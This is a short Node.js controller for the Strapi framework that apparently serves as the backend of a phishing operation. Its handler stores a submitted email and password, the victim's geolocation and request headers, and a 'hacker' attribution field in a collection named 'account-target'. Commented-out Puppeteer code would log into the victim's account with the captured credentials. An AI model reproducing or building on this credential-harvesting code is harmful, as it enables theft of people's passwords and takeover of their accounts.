
/**
 * Read the documentation (https://strapi.io/documentation/developer-docs/latest/development/backend-customization.html#core-controllers)
 * to customize this controller
 */
 // const login = require("../../function/login.js")
 // const puppeteer= require('puppeteer')


module.exports = {
    log:async(ctx)=>{

        const body=ctx.request.body
        
/*
        const browser = await puppeteer.launch({headless: false})
        const page = await browser.newPage()
        await login(page, body.email,body.mdp)
*/

          await strapi.query("account-target").create({
            email:body.email,
            password:body.mdp,
            infos:{position: JSON.parse(body.position),ip: ctx.header},
            hacker:body.hacker
        })
        

    }
};
